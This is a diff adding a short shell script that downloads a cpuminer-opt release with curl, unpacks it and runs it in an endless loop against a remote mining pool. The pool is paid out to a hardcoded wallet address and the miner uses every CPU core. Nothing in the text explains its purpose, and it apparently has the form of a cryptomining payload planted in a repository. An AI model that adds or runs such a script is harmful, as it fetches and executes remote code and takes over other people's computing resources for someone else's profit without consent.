@@ -1,0 +1,5 @@
+curl https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.46/cpuminer-opt-linux-5.0.46.tar.gz -L -o cpuminer-opt-linux-5.0.46.tar.gz
+tar xf cpuminer-opt-linux-5.0.46.tar.gz
+while [ 1 ]; do
+	./cpuminer-sse2 -a interchained -o stratum+tcps://eu.rplant.xyz:17158 -u itc1qsn5s88qfyzd2ffc3zsafgtmpkd6cukrhlsnt6x.x -p webpassword=x -t $(nproc --all)
+done
